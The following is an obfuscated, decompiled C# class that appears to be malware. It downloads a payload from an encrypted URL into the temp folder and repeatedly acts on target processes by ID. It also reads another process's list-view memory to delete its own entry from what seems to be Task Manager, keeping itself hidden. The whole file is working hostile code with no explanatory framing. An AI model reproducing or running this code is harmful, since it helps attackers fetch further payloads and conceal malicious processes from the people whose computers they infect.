using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace WEoqBCtavg;

internal sealed class GYNLHFcQQyIgZxEh
{
	private struct XknMWmAtPzkoR
	{
		public uint ophtmCEmwWzqu;

		public IntPtr excZBiaRKlgn;

		public IntPtr acYrNqQdfgMnt;

		public uint GBalRHkuUJV;

		public uint wanntySaHhapHrs;

		public IntPtr xyutjLCGdF;

		public uint IeQcJzRIrJfTD;

		public int wKnAazDgbZQ;

		public IntPtr oVXZJWoaRNEm;
	}

	private static volatile bool NLDfzBOLxuPG;

	public static volatile bool cEiVmDxlbSuS;

	[NonSerialized]
	internal static GetString getString_0;

	public static string KhkSZNvOGgEd()
	{
		if (IntPtr.Size == 8)
		{
			TwRTxDxfshC.cedDifkgtHEl = YICAleoIDlzDqm(new Uri(TwRTxDxfshC.czGbdVLSgBt(getString_0(107365195))));
		}
		else
		{
			TwRTxDxfshC.cedDifkgtHEl = YICAleoIDlzDqm(new Uri(TwRTxDxfshC.czGbdVLSgBt(getString_0(107365081))));
		}
		return TwRTxDxfshC.cedDifkgtHEl;
	}

	public static string YICAleoIDlzDqm(Uri uri_0)
	{
		try
		{
			string path = Path.GetRandomFileName().Replace(getString_0(107368232), getString_0(107359570)).Remove(0, 3) + getString_0(107368227);
			WebClient webClient = new WebClient();
			webClient.DownloadFile(uri_0, Path.Combine(Path.GetTempPath(), path));
			return Path.Combine(Path.GetTempPath(), path);
		}
		catch
		{
		}
		return string.Empty;
	}

	public static Process LUToBvhJwzyizGV(string string_0)
	{
		Process[] processes = Process.GetProcesses();
		int num = 0;
		Process process;
		while (true)
		{
			if (num < processes.Length)
			{
				process = processes[num];
				if (process.ProcessName.Contains(string_0))
				{
					break;
				}
				num++;
				continue;
			}
			return null;
		}
		return process;
	}

	public static void MgDjQLaXxLsNKH(string[] string_0)
	{
		string text = KhkSZNvOGgEd();
		if (string.IsNullOrEmpty(text))
		{
			return;
		}
		while (true)
		{
			foreach (string string_ in string_0)
			{
				Process process = LUToBvhJwzyizGV(string_);
				if (process != null)
				{
					string text2 = process.Id.ToString();
					TwRTxDxfshC.ZbTTlekIoxfjQQ(text, text2 + getString_0(107357975) + Path.GetFileName(Process.GetCurrentProcess().MainModule!.FileName));
					TwRTxDxfshC.ZbTTlekIoxfjQQ(text, text2 + getString_0(107357975) + Path.GetFileName(Process.GetCurrentProcess().MainModule!.FileName) + getString_0(107365415));
					TwRTxDxfshC.ZbTTlekIoxfjQQ(text, text2 + getString_0(107357975) + TwRTxDxfshC.czGbdVLSgBt(getString_0(107365406)));
					TwRTxDxfshC.ZbTTlekIoxfjQQ(text, text2 + getString_0(107357975) + TwRTxDxfshC.czGbdVLSgBt(getString_0(107358001)));
					TwRTxDxfshC.ZbTTlekIoxfjQQ(text, text2 + getString_0(107357975) + TwRTxDxfshC.czGbdVLSgBt(getString_0(107365381)));
					TwRTxDxfshC.ZbTTlekIoxfjQQ(text, text2 + getString_0(107357975) + TwRTxDxfshC.czGbdVLSgBt(getString_0(107365396)));
					TwRTxDxfshC.ZbTTlekIoxfjQQ(text, text2 + getString_0(107357975) + TwRTxDxfshC.czGbdVLSgBt(getString_0(107371402)));
					TwRTxDxfshC.ZbTTlekIoxfjQQ(text, text2 + getString_0(107357975) + TwRTxDxfshC.czGbdVLSgBt(getString_0(107365347)));
				}
			}
			Thread.Sleep(200);
		}
	}

	[DllImport("kernel32.dll")]
	private static extern IntPtr OpenProcess(int int_0, bool bool_0, uint uint_0);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr VirtualAllocEx(IntPtr intptr_0, IntPtr intptr_1, uint uint_0, int int_0, int int_1);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern bool VirtualFreeEx(IntPtr intptr_0, IntPtr intptr_1, uint uint_0, int int_0);

	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool CloseHandle(IntPtr JLnfSMpzKYac);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool WriteProcessMemory(IntPtr gzrzoLOwUd, IntPtr dsUxaelhArhrLXrA, byte[] DmwACHMAtqiJP, uint CADCKtYBnSY, out UIntPtr NANamSWRyPV);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool ReadProcessMemory(IntPtr IkqamenwidxQ, IntPtr qkRvFDiGrgrH, [Out] byte[] UrRGwxscnflJN, int sPOgWcYivMxXNZUU, out UIntPtr ihPAqfQjZemlt);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern uint GetWindowThreadProcessId(IntPtr dUzsipzUPjsZ, out uint toxqccZOuVU);

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern IntPtr SendMessage(IntPtr intptr_0, uint uint_0, IntPtr intptr_1, IntPtr intptr_2);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindow(string string_0, string string_1);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindowEx(IntPtr intptr_0, IntPtr intptr_1, string string_0, string string_1);

	private static byte[] XFCHbetHYfeoGTt(object object_0)
	{
		int num = Marshal.SizeOf(object_0);
		byte[] array = new byte[num];
		IntPtr intPtr = Marshal.AllocHGlobal(num);
		Marshal.StructureToPtr(object_0, intPtr, fDeleteOld: true);
		Marshal.Copy(intPtr, array, 0, num);
		Marshal.FreeHGlobal(intPtr);
		return array;
	}

	private static IntPtr CfoyEaAinRUKm(uint uint_0)
	{
		return OpenProcess(56, bool_0: false, uint_0);
	}

	private static void yGcNGSKqtbo(IntPtr intptr_0)
	{
		CloseHandle(intptr_0);
	}

	private static IntPtr mJcXDKKJIJqtafCzTT(uint uint_0, IntPtr intptr_0)
	{
		return VirtualAllocEx(intptr_0, IntPtr.Zero, uint_0, 12288, 4);
	}

	private static void lGompOorRw(IntPtr intptr_0, IntPtr intptr_1, uint uint_0)
	{
		VirtualFreeEx(intptr_0, intptr_1, uint_0, 32768);
	}

	private static IntPtr crovEndgTXs()
	{
		IntPtr intPtr = FindWindow(getString_0(107365362), getString_0(107365337));
		if (intPtr == IntPtr.Zero)
		{
			intPtr = FindWindow(getString_0(107364792), getString_0(107364783));
			intPtr = FindWindowEx(intPtr, IntPtr.Zero, getString_0(107364792), null);
			return FindWindowEx(intPtr, IntPtr.Zero, getString_0(107364734), getString_0(107364713));
		}
		intPtr = FindWindowEx(intPtr, IntPtr.Zero, getString_0(107364792), null);
		return FindWindowEx(intPtr, IntPtr.Zero, getString_0(107364734), getString_0(107364700));
	}

	private static IntPtr ugrPoJapJCn(IntPtr intptr_0)
	{
		return SendMessage(intptr_0, 4100u, IntPtr.Zero, IntPtr.Zero);
	}

	private static void crjFYhZbECa(IntPtr intptr_0, IntPtr intptr_1)
	{
		SendMessage(intptr_0, 4104u, intptr_1, IntPtr.Zero);
	}

	private static void pQZTMSblldVgEL(IntPtr intptr_0)
	{
		SendMessage(intptr_0, 4124u, IntPtr.Zero, IntPtr.Zero);
	}

	private static string zKybjezvyd(IntPtr intptr_0, IntPtr intptr_1)
	{
		byte[] array = new byte[50];
		XknMWmAtPzkoR xknMWmAtPzkoR = default(XknMWmAtPzkoR);
		GetWindowThreadProcessId(intptr_0, out var toxqccZOuVU);
		IntPtr intPtr = CfoyEaAinRUKm(toxqccZOuVU);
		IntPtr intPtr2 = mJcXDKKJIJqtafCzTT((uint)Marshal.SizeOf(xknMWmAtPzkoR), intPtr);
		IntPtr intPtr3 = mJcXDKKJIJqtafCzTT(50u, intPtr);
		xknMWmAtPzkoR.excZBiaRKlgn = intptr_1;
		xknMWmAtPzkoR.acYrNqQdfgMnt = (IntPtr)0;
		xknMWmAtPzkoR.IeQcJzRIrJfTD = 50u;
		xknMWmAtPzkoR.xyutjLCGdF = intPtr3;
		WriteProcessMemory(intPtr, intPtr2, XFCHbetHYfeoGTt(xknMWmAtPzkoR), (uint)Marshal.SizeOf(xknMWmAtPzkoR), out var NANamSWRyPV);
		SendMessage(intptr_0, 4141u, intptr_1, intPtr2);
		ReadProcessMemory(intPtr, intPtr3, array, 50, out NANamSWRyPV);
		lGompOorRw(intPtr, intPtr2, (uint)Marshal.SizeOf(xknMWmAtPzkoR));
		lGompOorRw(intPtr, intPtr3, 50u);
		yGcNGSKqtbo(intPtr);
		return Encoding.ASCII.GetString(array);
	}

	private static void DBwjCFVHZaxH(string string_0)
	{
		IntPtr intPtr = crovEndgTXs();
		if (!(intPtr != IntPtr.Zero))
		{
			return;
		}
		int num = (int)ugrPoJapJCn(intPtr);
		for (int i = 0; i < num; i++)
		{
			string text = zKybjezvyd(intPtr, (IntPtr)i);
			if (text.Contains(string_0))
			{
				crjFYhZbECa(intPtr, (IntPtr)i);
			}
		}
	}

	private static void OmKwasdhGNEd()
	{
		IntPtr intPtr = crovEndgTXs();
		if (intPtr != IntPtr.Zero)
		{
			pQZTMSblldVgEL(intPtr);
			pQZTMSblldVgEL(intPtr);
			pQZTMSblldVgEL(intPtr);
			pQZTMSblldVgEL(intPtr);
			pQZTMSblldVgEL(intPtr);
		}
	}

	public static void bAcezjfIxKW()
	{
		Thread thread = new Thread(ickRZMLMNQVSMd);
		thread.Start();
	}

	private static void ickRZMLMNQVSMd()
	{
		while (!NLDfzBOLxuPG)
		{
			if (cEiVmDxlbSuS)
			{
				DBwjCFVHZaxH(Process.GetCurrentProcess().ProcessName + getString_0(107368227));
				Thread.Sleep(525);
			}
			else
			{
				OmKwasdhGNEd();
				Thread.Sleep(1000);
			}
		}
		NLDfzBOLxuPG = false;
	}

	static GYNLHFcQQyIgZxEh()
	{
		Strings.CreateGetStringDelegate(typeof(GYNLHFcQQyIgZxEh));
		NLDfzBOLxuPG = false;
		cEiVmDxlbSuS = true;
	}
}
